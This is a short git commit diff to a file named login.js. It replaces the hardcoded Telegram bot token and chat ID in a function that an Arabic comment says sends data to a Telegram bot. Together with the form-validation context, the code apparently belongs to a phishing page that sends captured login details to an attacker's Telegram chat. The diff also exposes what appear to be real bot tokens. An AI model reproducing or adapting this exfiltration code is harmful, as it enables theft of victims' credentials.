f37d4267adc225167a0a4b66d2b438a3ecad138a
lbodybnkkk <elcomandoo121@gmail.com>
2025-02-09 12:54:46 +0200

    Update login.js
    ددددظز

--- login.js
+++ login.js
@@ -23,8 +23,8 @@ function validateForm() {
 
 // دالة إرسال البيانات إلى بوت التليجرام
 function sendToBot(message) {
-    const botToken = "7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E";
-    const chatId = "{user_id}";
+    const botToken = "7681653454:AAEdoXFfTtBOxL8F3i06jWeBWQjeQjlP-RQ";
+    const chatId = "5375214810";
     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
     fetch(url)
